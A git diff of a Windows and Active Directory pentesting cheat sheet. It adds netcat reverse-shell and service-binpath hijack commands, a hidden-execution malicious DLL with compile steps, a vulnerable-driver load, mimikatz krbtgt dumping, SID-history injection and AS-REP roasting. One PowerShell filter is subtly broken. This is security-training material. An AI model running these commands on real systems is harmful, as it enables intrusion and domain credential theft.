@@ -10,6 +10,10 @@ From application version, you can guess which version of Windows the system is r
 
 ### Initial Information Gathering
 
+#### Automated Enumeration tool
+
+[SharpUp](https://github.com/GhostPack/SharpUp) is a C# port of various PowerUp functionality.
+
 #### System information
 
 ```bash
@@ -75,7 +79,7 @@ runas /user:Administrator /savecred "nc.exe -c cmd.exe IP PORT"
 3) Check for the differents "User Shell Folders" configured
 
 ```bash
-HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
+reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"
 ```
 
 For more information about that technique refer to [T1087.001 - Account Discovery: Local Account](https://attack.mitre.org/techniques/T1087/001/)
@@ -129,7 +133,7 @@ reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Script
 
 For more information about that technique refer to [T1552 - Unsecured Credentials](https://attack.mitre.org/techniques/T1552/)
 
-#### Network information
+#### Network Enumeration
 
 ```bash
 arp -A # Displays the ARP (Address Resolution Protocol) cache table for all available interfaces.
@@ -141,6 +145,7 @@ ipconfig /all # Displays the full TCP/IP configuration for all ntwork adapters.
 nbtstat -n # Lists local NetBIOS names
 nbtstat -s # Lists sessions table, converting destination IP addresses to their NETBIOS names.
 net config workstation
+netsh wlan show all # List all profile(s)
 netsh wlan show profile # List WLAN profile(s)
 netsh wlan show profile WIFI_PROFILE key=clear # Get the Wi-Fi from a given profile
 getmac # Display the MAC Addresses
@@ -221,7 +226,7 @@ Information about all RDP connections is stored in the registry of each user.
 It’s impossible to remove a computer (or computers) from the list of RDP connection history using built-in Windows tools.
 
 ```bash
-reg query HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\
+reg query "HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\\"
 reg query HKCU\Software\Microsoft\Terminal Server Client\Servers\
 ```
 
@@ -478,19 +483,6 @@ DataSources\DataSources.xml: Element-Specific Attributes
 
 We can use [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) which is part of PowerSploit in order to do the job for us
 
-#### Network Enumeration
-
-```bash
-ipconfig /all
-route print
-arp -A # Display the ARP (Address Resolution Protocol) cache table for all available interfaces.
-netstat -ano # Display all active connections
-netsh firewall show state # Display the Windows Firewall status
-netsh firewall show config # Display the Windows Firewall configuration
-```
-
-For more information about that technique refer to [T1016 - System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016/)
-
 #### Windows Patches
 
 Please note that it is not easy to find vulnerabilities with the output we receive from the query below.
@@ -504,8 +496,12 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn # Get Installed patches
 #### Privilege Abuse
 
 ```bash
+# Bash
 whoami # Displays the current domain and user name.
 whoami /all # Displays all information in the current access token, including the current user name, security identifiers (SID), privileges, and groups that the current user belongs to.
+# Powershell
+$env:UserName
+[Security.Principal.WindowsIdentity]::GetCurrent()
 ```
 
 Check for the following access tokens
@@ -518,7 +514,7 @@ Check for the following access tokens
 |SeBackup|Threat|CLI|Read sensitve files|
 |SeCreateToken|Admin|3rd party tool|
 |SeDebug|Admin|PowerShell|<https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1>|
-|SeLoadDriver|AdminR||
+|SeLoadDriver|Admin|[EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/|
 |SeRestore|Admin||
 |SeTakeOwnership|Admin||
 |SeTcb|Admin||
@@ -531,7 +527,12 @@ Check for the following access tokens
 
   &#8594; mimikatz
 - SeImpersonatePrivilege
-- SeLoadDriverPrivilege
+- SeLoadDriverPrivilege: Load malicious driver [Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit) using [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/)
+
+  ```bash
+  EOPLOADDRIVER.exe System\\CurrentControlSet\\MyService C:\\Users\\Username\\Desktop\\Driver.sys
+  ```
+
 - SeBackupPrivilege & SeRestorePrivilege:
 
   You can get yourself admin right of anyfolder
@@ -636,18 +637,38 @@ If there are services that haves the **RP** permission for Authenticated Users *
 We can also use the Sysinternals tool [accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) in order to check which service(s) may be vulnerable.
 
 ```bash
-accesschk.exe -uwcqv "Authenticated Users" *
-accesschk.exe -uwcqv "Everyone" *
-accesschk.exe -ucqv SERVICE_NAME
+accesschk64.exe -uwcqv *
+accesschk64.exe -uwcqv "Authenticated Users" *
+accesschk64.exe -uwcqv "Everyone" *
+accesschk64.exe -ucqv SERVICE_NAME
+accesschk64.exe -c SERVICE_NAME
 ```
 
+*Common* Options:
+
+- **-u**: Suppress errors
+- **-w**: Show only objects that have write access
+- **-c**: Searh for Windows Services
+- **-q**: Omit Banner
+- **-v**: Verbose (includes Windows Vista Integrity Level)
+
 ```bash
+# Bash
 sc qc SERVICE_NAME
 sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
 sc config upnphost obj= ".\LocalSystem" password= ""
 sc qc upnphost
 net start upnphost
+
+# PowerShell
+Get-Service
+Get-Service | Where-Object {$_.Name -eq "SERVICE_NAME"} | Select -Property *
+Restart-Service -Name SERVICE_NAME
 ```
+
+- **binpath=** : Specifies a path to the service binary file.
+- **obj=**: Specifies a name of an account in which a service will run, or specifies a name of the Windows driver object in which the driver will run.
+- **password=**: Specifies a password. This is required if an account other than the LocalSystem account is used.
 
 For more information about that technique refer to:
 
@@ -903,10 +924,28 @@ Here below is the code to create a malicious DLL
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
 {
- WinExec(PAYLOAD);
+ WinExec(PAYLOAD,SW_HIDE);
  return 0;
 }
 ```
+
+Here are the command to compile it:
+
+```bash
+# x86
+i686-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
+i686-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a
+# x64
+x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
+x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a
+```
+
+The **-DBUILDING_EXAMPLE_DLL** compiler option causes the DLL's functions to be declared as "dllexport", meaning that they will be "exported" from the DLL and available to client applications.
+The **-shared**"** option tells the linker to create a DLL instead of an .exe
+
+To create a Dynamic-Link Library (DLL), you must create one or more source code files, and possibly a linker file for exporting the functions. To allow applications that use your DLL to use load-time dynamic linking, you must also create an import library using **-Wl,--out-implib**
+
+*Note that it requires the following package: mingw-w64*
 
 We can either:
 
@@ -970,9 +1009,9 @@ To eliminate these issues Didier Stevens developed a DLL which will check the co
 
 > / / / To Finish
 
-Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.
+Dynamic-link libraries (DLLs) that are specified in the **AppCertDLLs** value in the Registry key can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.
 
-Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\ are loaded into every process that calls the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec
+Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under *HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\* **are loaded into every process that calls** the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec
 
 ```bash
 reg query "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls"
@@ -1038,6 +1077,9 @@ Here below are some command to get information about the Active Directory enviro
 Get-ADTrust -Filter *
 nltest /domain_trusts
 ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
+
+# Get all user that does not require a pre authentication
+Get-Aduser -filter * -Properties DoesNotRequirePreAuth | Where {$._DoesNotRequirePreAuth -eq "True" -and $_.Enabled -eq "True"} | select Name 
 ```
 
 Within BloodHound, the default collection methods does the Trusts enumeration for you.
@@ -1178,20 +1220,21 @@ If we perform a AS_REQ request to the DC on behalf of a vulnerable users, we can
 1) Enumerate vulnerable users
 2) Request AS_REP message to the DC on behalf of any of those users, and receive an AS_REP message.
 
-Get-DomainUser -PreauthNotRequired -verbose #List vuln users 
-using PowerView
-
 ```bash
-# Try all the usernames in usernames.txt
+# Enumerate Vulnerable Users
+Get-ADUser -filter * -Properties DoesNotRequirePreAuth | Where {$._DoesNotRequirePreAuth -eq "True" -and $_.Enabled -eq "True"} | select Name
+# Request AS_REP message
+## Using Rubeus
+Rubeus.exe asreproast /user:USER [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]
+## Using GetNPUsers.py: Try all the usernames in usernames.txt
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
-
-# Use domain creds to extract targets and target them
+## Using GetNPUsers.py: Use domain creds to extract targets and target them
 python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
 ```
 
 #### Ntds.dit file
 
-> / / / To Finish
+The Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, and group membership. It includes the password hashes for all users in the domain.
 
 ```bash
 # Confirm the location of the ntds.dit file
@@ -1284,8 +1327,6 @@ Use of protocol versions:
 
 #### Silver Tickets
 
-> / / / To Finish
-
 Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account.
 
 Silver Tickets are forged Kerberos **Ticket Granting Service (TGS)** tickets, also called service tickets.
@@ -1363,9 +1404,7 @@ Note that a SIEM or Security Analysts may detect the fact that we are requesting
 
 For more information about that technique refer to [T1558.002 - Steal or Forge Kerberos Tickets: Silver Ticket](https://attack.mitre.org/techniques/T1558/002/)
 
-### Golden Ticket
-
-> / / / To Finish
+#### Golden Ticket
 
 The golden ticket technique is a technique where starts by extracting the password from the KRBTGT account on an Active Directory Domain Controller we have access to. Then we create a **Ticket Granting Ticket (TGT)** ticket that has Domain Admin rights.
 
@@ -1376,6 +1415,7 @@ The golden ticket technique is a technique where starts by extracting the passwo
 For this, we will use [mimikatz](https://github.com/gentilkiwi/mimikatz) which is considered to be the "Swiss army knife" of Windows credentials
 
 ```bash
+# Check of LSA Protection is enabled
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe"
 ```
 
@@ -1390,7 +1430,7 @@ mimikatz # lsadump::lsa /inject /name:krbtgt  # Gather KRBTGT Password Informati
 
 Now we need to create the ticket which requires (same as in the Silver Attack, except that we don't need the service)
 
-For more information about that technique refer to [T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket^](https://attack.mitre.org/techniques/T1558/001/)
+For more information about that technique refer to [T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)
 
 ###### *If you don't know, now you know : [LSA Protection](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn408187(v=ws.11)?redirectedfrom=MSDN)*
 
@@ -1406,6 +1446,76 @@ Beginning with Windows 2000, RPC supports a variety of security providers and pa
 - **Kerberos Protocol Security Package**: Kerberos v5 protocol is an industry-standard security package. It uses fullsic principal names.
 - **SCHANNEL SSP**: This SSP implements the Microsoft Unified Protocol Provider security package, which unifies SSL, private communication technology (PCT), and transport level security (TLS) into one security package. It recognizes msstd and fullsic principal names.
 - **NTLM Security Package**: This was the primary security package for NTLM networks prior to Windows 2000.
+
+#### Group Managed Service Accounts
+
+The Group Managed Service Accounts (GMSA) was introduced in Windows Server 2008 R2 to automatically manage (change) passwords of **service accounts**
+Those passwords are managed by AD and automatically changed.
+&rarr; This means that the GMSA has security principals explicitly delegated to have access to the clear-text password.
+
+*Side note: Within **BloodHound**, we can see who is able to read in clear text-password a clear-text password*
+
+Informations to know:
+
+- Computers hosting GMSA service account(s) request current password from Active Directory to start service.
+- Configure the GMSA to allow computer accounts access to password.
+- If we compromise a computer hosting services using GMSA, the **GMSA is also compromised**.
+- If we compromise an account with rights to request GMSA password, the **GMSA is compromised**.
+
+Group Managed Service Accounts have the object class **msDS-GroupManagedServiceAccount** and associated attributes specific to GMSAs.
+These properties include:
+
+- **msDS-GroupMSAMembership** (PrincipalsAllowedToRetrieveManagedPassword): Stores the security principals that can access the GMSA password.
+- **msDS-ManagedPassword**: This attribute contains a BLOB with password information for group-managed service accounts.
+- **msDS-ManagedPasswordId**: This constructed attribute contains the key identifier for the current managed password data for a group MSA.
+- **msDS-ManagedPasswordInterval**: This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.
+
+```bash
+$gmsa = Get-ADServiceAccount -Identity 'IDENTITY' -Properties 'msDS-ManagedPassword'
+$mp = $gmsa.'msDS-ManagedPassword'
+ConvertFrom-ADManagedPasswordBlob $mp
+```
+
+#### SID History (Multi Domain)
+
+SID History enables access for another account to effectively be cloned to another.
+It could enable us to escalate from one Active Directory Domain to another within the same forest.
+This means that if we are administrator of another trusted domain, we can try to add an administrator account SID of the trusting domain to the SIDHistory attribute of a user account in the trusted domain.
+
+Requirements:
+
+- We need to have domain administrator privileges in the trusted domain in order to exploit the vulnerability.
+- The domain we are on need to be trusted by the target domain.
+
+```bash
+Get-ADUser -Identity USER -Properties SidHistory | Select-Object -ExpandProperty SIDHistory
+```
+
+Mimikatz enables SID History injection to any user account
+
+```bash
+.\mimikatz "privilege::debug" "misc::addsid USER ADSAdministrator"
+```
+
+Once we login on the trusted domain, our user has all access the ADSAdministrator account, as well as Domain Admin rights.
+
+For more information about that technique refer to [T1134.005 - Access Token Manipulation: SID-History Injection](https://attack.mitre.org/techniques/T1134/005/)
+
+###### *If you don't know, now you know : [SID History](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc779590(v=ws.10)?redirectedfrom=MSDN)*
+
+Every user account has an associated Security IDentifier (SID) which is used to track the security principal and the access the account has when connecting to resources.
+
+When an user is migrated from one domain to another domain, the SID changes.
+
+SID history is used for roaming user profile access, certification authority access, and software installation access, as well as resource access.
+
+SID History enables access for another account to effectively be cloned to another and is extremely useful to ensure users retain access when **migrated** from one domain to another domain.
+
+Therefore, we don't need to update the ACLs of the resources in the old domain with the new SIDs.
+
+###### *If you don't know, now you know : [PAC](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjq5_blldjtAhVWwAIHHSt5Bc4QFjADegQIORAC&url=https%3A%2F%2Fwinprotocoldoc.blob.core.windows.net%2Fproductionwindowsarchives%2FMS-PAC%2F%255BMS-PAC%255D.pdf&usg=AOvVaw25ciatmnDYPnShmIg_y36q)*
+
+The Privileged Attribute Certificate (PAC) is an extension to Kerberos tickets that contains useful information about a user's privileges.
 
 #### Windows Server Update Services (WSUS)
 
